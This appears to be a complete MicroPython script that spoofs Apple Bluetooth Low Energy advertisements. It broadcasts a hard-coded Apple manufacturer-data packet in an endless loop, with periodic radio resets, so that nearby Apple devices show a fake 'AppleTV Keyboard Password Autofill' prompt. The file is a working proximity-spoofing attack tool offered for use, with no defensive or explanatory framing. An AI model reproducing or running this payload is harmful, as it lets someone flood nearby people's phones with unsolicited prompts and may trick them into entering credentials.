import bluetooth
import time

def advertise():
    print("Starting AppleTV Keyboard Password Autofill Prompt Advertising")
    ble.gap_advertise(interval, adv_data=bytes(data1))

# Initialize BLE
print("Initializing BLE...")
ble = bluetooth.BLE()
ble.active(True)

if ble.active():
    print("BLE is active")
else:
    print("Failed to activate BLE")

# Parameters
interval = 200

# Static data field
data1 = (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)

# Counter for BLE reset
ble_reset_counter = 0
ble_reset_threshold = 10

# Main Loop
while True:
    if ble_reset_counter >= ble_reset_threshold:
        print("Resetting BLE...")
        ble.active(False)
        time.sleep(1)
        ble.active(True)
        
        ble_reset_counter = 0

    advertise()
    time.sleep(2)
    ble_reset_counter += 1
